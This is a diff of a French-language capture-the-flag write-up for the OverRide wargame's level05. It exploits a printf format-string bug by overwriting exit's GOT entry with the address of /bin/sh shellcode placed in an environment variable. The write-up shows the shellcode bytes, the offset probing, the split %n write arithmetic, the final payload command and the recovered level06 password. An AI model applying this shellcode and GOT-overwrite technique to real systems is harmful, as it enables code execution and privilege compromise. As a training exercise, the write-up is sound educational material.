@@ -54,9 +54,16 @@ Dump of assembler code for function main:
    0x08048513 <+207>:	call   0x8048370 <exit@plt>
 End of assembler dump.
 
-offset 10
-
+On observe l'absence d'appel a system ou execve on en deduit donc que l'on devras utiliser un shellcode
 export SHELLCODE=$(python -c 'print "\x90" * 100 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')
+L'appel a printf est vulnerable et on remarque un appel a exit@plt que l'on va pouvoir manipuler
+Nous allons modifier l'adresse de exit par celle de notre shellcode
+Trouvons l'offset de printf
+level05@OverRide:~$ ./level05
+AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.
+aaaa64.f7fcfac0.0.0.0.0.ffffffff.ffffd774.f7fdb000.61616161.252e7825.78252e78.2e78252e.252e7825.
+A la 10eme position on retrouver 61616161 qui est aaaa
+Maintenant trouvons l'adresse reel de exit
 
 level05@OverRide:~$ objdump -R ./level05
 
@@ -64,20 +71,11 @@ level05@OverRide:~$ objdump -R ./level05
 
 DYNAMIC RELOCATION RECORDS
 OFFSET   TYPE              VALUE
-080497c4 R_386_GLOB_DAT    __gmon_start__
-080497f0 R_386_COPY        stdin
-080497d4 R_386_JUMP_SLOT   printf
-080497d8 R_386_JUMP_SLOT   fgets
-080497dc R_386_JUMP_SLOT   __gmon_start__
+...
 080497e0 R_386_JUMP_SLOT   exit
-080497e4 R_386_JUMP_SLOT   __libc_start_main
+...
 
-(gdb) disass 0x080497e0
-Dump of assembler code for function exit@got.plt:
-   0x080497e0 <+0>:	jbe    0x8049765 <_DYNAMIC+105>
-   0x080497e2 <+2>:	add    $0x8,%al
-End of assembler dump.
-
+Maintenant trouvons l'adresse de notre SHELLCODE
 (gdb) b *0x0804845d
 Breakpoint 1 at 0x804845d
 (gdb) r
@@ -100,10 +98,29 @@ Breakpoint 1, 0x0804845d in main ()
 0xffffd8e2:	0x69	0x6e	0x89	0xe3	0x31	0xc9	0xcd	0x80
 0xffffd8ea:	0x00	0x53
 
-0xffffd86c en decimal = 4294957232
+Prenons 0xffffd86c
+0xffffd86c en decimal = 4294957164
+Avec %n ecrire 4294957164 est assez compliquer on va donc split
+l'adresse en 2 parties ffff et d86c et les ecrire une a une
+Il nous faut trouver l'adresse+2 de exit et si elle est sur la stack alors on pourra
+faire comme on le souhaite. Par chance :
+(gdb) disass 0x080497e0
+Dump of assembler code for function exit@got.plt:
+   0x080497e0 <+0>:	jbe    0x8049765 <_DYNAMIC+105>
+   0x080497e2 <+2>:	add    $0x8,%al
+End of assembler dump.
 
-(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55399x" + "%10$n" + "%10128x" + "%11$n"'; cat) | ./level05
+Adressee+2 est la fin de notre exit. On va donc pouvoir reecrire l'entree et la sortie de exit afin
+d'appeler notre SHELLCODE
+
+d86c = 55407 - 8 = 55399
+ffff = 65535 - 55407 = 10128
+
+(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55399d" + "%10$n" + "%10128d" + "%11$n"'; cat) | ./level05
 
 
 cat /home/users/level06/.pass
 h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+
+
+doc : http://jbremer.org/format-string-vulnerabilities/
